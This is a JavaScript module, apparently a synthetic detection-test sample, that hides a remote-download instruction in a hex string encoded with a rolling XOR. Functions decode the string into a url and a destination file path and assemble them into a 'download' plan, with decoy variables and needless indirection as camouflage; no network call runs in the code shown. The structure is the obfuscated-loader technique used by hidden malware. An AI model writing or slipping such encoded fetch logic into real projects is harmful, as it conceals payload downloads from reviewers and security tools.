const moduleShape = Object.freeze({ format: "commonjs" });
const Material_06eb8013 = "487544384b3f5a2a5964056617620b791c433154395622476b1c6e077316492f462a4f335236572753364479116511613e4a257a097d0f6a0b661a691d7c1b7e21422d5836427f4e3251305d2d4c25422c731a7e430d4206436e2b1e2c682c682a1f63166408355d295d2d5e644b640a650164492c192b4f2b4f2d182d152d4967027a1b76066a0f21482650315d34507f1e6e077b0e7d186a35543356384c713f503451106501681c3356635135492f462a4f106001751d200f7b16664921543a4e3c592a59741a7511745b7506721374113c596c5e3a5e3a586d5860583c127f1566";
const Codec_06eb8013 = "hex_buffer|rolling_xor|3e";

function load_06eb8013() { return [...Buffer.from(Material_06eb8013, "hex")]; }
function decode_06eb8013(storedBytes) { let priorByte = 62; return storedBytes.map((value) => { const decoded = value ^ priorByte; priorByte = value; return decoded; }); }
async function recover_06eb8013() {
  const harmlessValue = { ...{ north: 1 }, south: 2 };
  const storedBytes = load_06eb8013(); let recoveredBytes = [];
  const decodeTarget = decode_06eb8013; recoveredBytes = decodeTarget(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_06eb8013() { return JSON.parse(JSON.stringify({ value: await recover_06eb8013() })).value; }
async function plan_06eb8013() { const inspect = inspect_06eb8013; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
void moduleShape; void plan_06eb8013;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_06eb8013());
